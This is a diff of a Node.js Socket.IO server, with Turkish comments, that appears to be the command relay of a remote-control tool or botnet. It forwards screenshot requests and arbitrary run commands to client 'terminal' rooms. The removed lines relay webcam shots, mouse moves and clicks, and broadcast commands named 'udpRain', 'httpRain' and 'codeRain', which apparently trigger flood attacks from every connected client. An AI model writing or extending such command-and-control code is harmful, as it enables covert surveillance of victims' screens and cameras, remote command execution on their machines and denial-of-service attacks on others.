@@ -38,21 +38,20 @@ io.on('connection', (socket) => {
     // Ortak olay işleyici
     const handleRelayEvent = (eventName) => {
         return (data) => {
+
             if (!data || !data.from) {
                 return socket.emit('error', `Invalid ${eventName} data`);
             }
-            io.to(data.from).emit(eventName, data);
+
+            console.log({ eventName, data });
+            io.to(data.to).emit(eventName, data);
         };
     };
 
     // Olaylar için relay işlemleri
     [
         'screenshotRequest',
-        'camShotRequest',
         'screenshotResponse',
-        'camShotResponse',
-        'mousemove',
-        'click',
         'getRunResponse'
     ].forEach(event => {
         socket.on(event, handleRelayEvent(event));
@@ -64,20 +63,18 @@ io.on('connection', (socket) => {
             return socket.emit('error', 'Invalid command data');
         }
 
-        const { cmd, from } = data;
+        const { cmd, from, to } = data;
 
         if (cmd === 'getUsers') {
-            const rooms = Array.from(io.sockets.adapter.rooms);
-            io.to(from).emit('getRunResponse', {
+            const rooms = Array.from(Object(io.sockets.adapter.rooms).keys()).filter(room => room.includes('terminal'));
+
+            io.to(to).emit('getRunResponse', {
                 ...data,
-                cmd: rooms.join('\r\n')
+                cmd: rooms
             });
         }
-        else if (['udpRain', 'httpRain', 'codeRain'].some(term => cmd.includes(term))) {
-            console.log(`${cmd.split(' ')[0]} triggered on server`);
-            io.emit('getRunRequest', data);
-        }
         else {
+   
             io.to(from).emit('getRunRequest', data);
         }
     });
@@ -101,4 +98,4 @@ const start = () => {
     });
 }
 
-module.exports = {server, start};
+module.exports = { server, start };
